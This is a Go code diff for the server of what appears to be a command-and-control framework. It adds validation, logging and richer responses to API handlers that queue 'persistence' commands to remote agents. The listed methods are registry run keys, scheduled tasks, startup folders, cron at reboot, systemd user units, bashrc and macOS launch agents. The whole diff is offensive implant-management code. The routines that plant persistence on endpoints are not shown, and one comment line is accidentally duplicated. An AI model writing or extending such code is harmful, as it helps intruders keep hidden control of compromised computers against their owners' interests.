@@ -148,6 +148,7 @@ func (h *Handlers) StartProcess(c *gin.Context) {
 }
 
 // SetupPersistence sets up persistence mechanism
+// SetupPersistence sets up persistence mechanism
 func (h *Handlers) SetupPersistence(c *gin.Context) {
 	agentID := c.Param("id")
 
@@ -177,9 +178,60 @@ func (h *Handlers) SetupPersistence(c *gin.Context) {
 		return
 	}
 
-	if req.PersistName == "" {
-		req.PersistName = fmt.Sprintf("Taburtuai_%s_%s", req.PersistMethod, uuid.New().String()[:6])
+	// Validate persistence method
+	validMethods := map[string]bool{
+		// Windows methods
+		"registry_run":     true,
+		"schtasks_onlogon": true,
+		"schtasks_daily":   true,
+		"startup_folder":   true,
+		// Linux methods
+		"cron_reboot":  true,
+		"systemd_user": true,
+		"bashrc":       true,
+		// macOS methods
+		"launchagent": true,
+		// Legacy aliases (will be normalized by agent)
+		"registry":  true,
+		"reg":       true,
+		"run":       true,
+		"schtask":   true,
+		"task":      true,
+		"scheduled": true,
+		"startup":   true,
+		"folder":    true,
+		"cron":      true,
+		"systemd":   true,
+		"service":   true,
+		"bash":      true,
+		"shell":     true,
+		"launch":    true,
+		"agent":     true,
+		"plist":     true,
 	}
+
+	if !validMethods[req.PersistMethod] {
+		c.Status(http.StatusBadRequest)
+		h.APIResponse(c, false, "", nil, fmt.Sprintf("Invalid persistence method: %s", req.PersistMethod))
+		return
+	}
+
+	// Auto-generate name if not provided
+	if req.PersistName == "" {
+		req.PersistName = fmt.Sprintf("Taburtuai_%s_%s", req.PersistMethod, uuid.New().String()[:8])
+	}
+
+	// Validate process path
+	if req.ProcessPath == "" {
+		c.Status(http.StatusBadRequest)
+		h.APIResponse(c, false, "", nil, "Process path is required")
+		return
+	}
+
+	// Log the persistence setup attempt
+	h.server.Logger.LogCommandExecution(agentID,
+		fmt.Sprintf("PERSIST_SETUP %s:%s", req.PersistMethod, req.PersistName),
+		"Queued", true)
 
 	cmd := &types.Command{
 		ID:            uuid.New().String(),
@@ -193,18 +245,37 @@ func (h *Handlers) SetupPersistence(c *gin.Context) {
 		CreatedAt:     time.Now(),
 		Status:        "pending",
 		Timeout:       120,
+		Metadata: map[string]string{
+			"persist_method": req.PersistMethod,
+			"persist_name":   req.PersistName,
+			"process_path":   req.ProcessPath,
+			"process_args":   req.ProcessArgs,
+			"requested_by":   c.ClientIP(),
+		},
 	}
 
-	h.server.CommandQueue.Add(agentID, cmd)
+	// Add to queue
+	if err := h.server.CommandQueue.Add(agentID, cmd); err != nil {
+		h.server.Logger.Error("SYSTEM", fmt.Sprintf("Failed to queue persistence setup: %v", err), agentID, "", nil)
+		c.Status(http.StatusInternalServerError)
+		h.APIResponse(c, false, "", nil, "Failed to queue persistence setup command")
+		return
+	}
+
 	h.server.Logger.LogCommandExecution(agentID, fmt.Sprintf("PERSIST_SETUP %s", req.PersistMethod), "Queued", true)
 
+	// Enhanced response format
 	h.APIResponse(c, true, "Persistence setup command queued", map[string]interface{}{
 		"command_id":   cmd.ID,
 		"persist_name": req.PersistName,
+		"method":       req.PersistMethod,
+		"path":         req.ProcessPath,
+		"args":         req.ProcessArgs,
+		"timeout":      cmd.Timeout,
+		"created_at":   cmd.CreatedAt.Format(time.RFC3339),
 	}, "")
 }
 
-// RemovePersistence removes persistence mechanism
 func (h *Handlers) RemovePersistence(c *gin.Context) {
 	agentID := c.Param("id")
 
@@ -232,6 +303,44 @@ func (h *Handlers) RemovePersistence(c *gin.Context) {
 		return
 	}
 
+	// Validate persistence method
+	validMethods := map[string]bool{
+		// Windows methods
+		"registry_run":     true,
+		"schtasks_onlogon": true,
+		"schtasks_daily":   true,
+		"startup_folder":   true,
+		// Linux methods
+		"cron_reboot":  true,
+		"systemd_user": true,
+		"bashrc":       true,
+		// macOS methods
+		"launchagent": true,
+		// Legacy aliases
+		"registry":  true,
+		"reg":       true,
+		"run":       true,
+		"schtask":   true,
+		"task":      true,
+		"scheduled": true,
+		"startup":   true,
+		"folder":    true,
+		"cron":      true,
+		"systemd":   true,
+		"service":   true,
+		"bash":      true,
+		"shell":     true,
+		"launch":    true,
+		"agent":     true,
+		"plist":     true,
+	}
+
+	if !validMethods[req.PersistMethod] {
+		c.Status(http.StatusBadRequest)
+		h.APIResponse(c, false, "", nil, fmt.Sprintf("Invalid persistence method: %s", req.PersistMethod))
+		return
+	}
+
 	cmd := &types.Command{
 		ID:            uuid.New().String(),
 		AgentID:       agentID,
@@ -242,11 +351,29 @@ func (h *Handlers) RemovePersistence(c *gin.Context) {
 		CreatedAt:     time.Now(),
 		Status:        "pending",
 		Timeout:       120,
+		Metadata: map[string]string{
+			"persist_method": req.PersistMethod,
+			"persist_name":   req.PersistName,
+			"requested_by":   c.ClientIP(),
+		},
 	}
 
-	h.server.CommandQueue.Add(agentID, cmd)
+	// Add to queue
+	if err := h.server.CommandQueue.Add(agentID, cmd); err != nil {
+		h.server.Logger.Error("SYSTEM", fmt.Sprintf("Failed to queue persistence removal: %v", err), agentID, "", nil)
+		c.Status(http.StatusInternalServerError)
+		h.APIResponse(c, false, "", nil, "Failed to queue persistence removal command")
+		return
+	}
+
 	h.server.Logger.LogCommandExecution(agentID, fmt.Sprintf("PERSIST_REMOVE %s", req.PersistMethod), "Queued", true)
 
-	h.APIResponse(c, true, "Persistence removal command queued",
-		map[string]interface{}{"command_id": cmd.ID}, "")
+	// Enhanced response format
+	h.APIResponse(c, true, "Persistence removal command queued", map[string]interface{}{
+		"command_id": cmd.ID,
+		"method":     req.PersistMethod,
+		"name":       req.PersistName,
+		"timeout":    cmd.Timeout,
+		"created_at": cmd.CreatedAt.Format(time.RFC3339),
+	}, "")
 }
